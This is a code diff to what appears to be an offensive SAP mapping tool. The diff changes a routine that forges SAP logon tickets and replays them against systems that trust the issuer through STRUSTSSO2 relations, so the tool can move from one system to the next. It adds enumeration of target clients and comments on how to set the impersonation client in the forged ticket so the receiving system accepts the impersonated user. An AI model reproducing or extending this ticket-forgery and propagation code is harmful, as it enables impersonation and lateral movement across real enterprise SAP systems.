@@ -6621,6 +6621,38 @@ def create_app(api: SAPMAPApi) -> Bottle:
             from sap_ticket_propagate import (
                 propagate_via_forged_ticket)
 
+            def _target_clients(target_node, rel_client):
+                """Return list of client numbers to try on the target.
+
+                Priority: rel.trusting_client (if specifically set in
+                the trust relation) → target_node.clients (enumerated
+                during discovery) → operator-supplied recipient_client
+                → SAP defaults [000, 001].
+
+                NEVER falls back to the source-system's client (which
+                may not exist on the target — e.g. issuer has 100 but
+                target only has 000/001).
+                """
+                if rel_client:
+                    return [rel_client]
+                enumerated = []
+                for c in (target_node.clients or []):
+                    nr = (c.get("nr") if isinstance(c, dict)
+                          else str(c)) or ""
+                    nr = nr.strip().zfill(3)
+                    # Skip 000 unless it's the only one — usually
+                    # not a useful logon target
+                    if nr and nr not in enumerated:
+                        enumerated.append(nr)
+                if enumerated:
+                    # Move 000 to the end (least useful)
+                    enumerated = ([c for c in enumerated if c != "000"]
+                                  + [c for c in enumerated if c == "000"])
+                    return enumerated
+                if recipient_client:
+                    return [recipient_client]
+                return ["001", "000"]
+
             # Derive fanout targets from state.trust_relations FIRST
             # so we can forge per-target pinned tickets.
             fanout_targets = []  # list of (target_sid, target_client)
@@ -6632,15 +6664,17 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     continue
                 # Skip if target SID not on the map (we need a node
                 # to replay against)
-                if rel.trusting_sid not in api.state.nodes:
+                target_node = api.state.nodes.get(rel.trusting_sid)
+                if not target_node:
                     continue
-                tgt_client = (rel.trusting_client
-                              or recipient_client or client or "100")
-                key = (rel.trusting_sid, tgt_client)
-                if key in seen_targets:
-                    continue
-                seen_targets.add(key)
-                fanout_targets.append((rel.trusting_sid, tgt_client))
+                for tgt_client in _target_clients(
+                        target_node, rel.trusting_client):
+                    key = (rel.trusting_sid, tgt_client)
+                    if key in seen_targets:
+                        continue
+                    seen_targets.add(key)
+                    fanout_targets.append(
+                        (rel.trusting_sid, tgt_client))
 
             if not fanout_targets:
                 print(f"[*] {sid}: no STRUSTSSO2-trusted receivers "
@@ -6665,11 +6699,17 @@ def create_app(api: SAPMAPApi) -> Bottle:
                           f"skipping")
                     continue
 
-                print(f"[*] {sid}: forging ticket {user}/{client} "
-                      f"pinned for {target_sid}/{target_client}...")
+                # The impersonation client (MANDT in InfoUnit 0x02)
+                # determines which client the receiver looks the user
+                # up in.  Use the target's client — the ticket claims
+                # "this user, in this client on the target".
+                impersonation_client = target_client
+                print(f"[*] {sid}: forging ticket "
+                      f"{user}/{impersonation_client} pinned for "
+                      f"{target_sid}/{target_client}...")
                 r = extract_and_forge_ticket(
                     node=node, state=api.state,
-                    user=user, client=client,
+                    user=user, client=impersonation_client,
                     validity_min=validity_min, digest=digest,
                     recipient_sid=target_sid,
                     recipient_client=target_client,
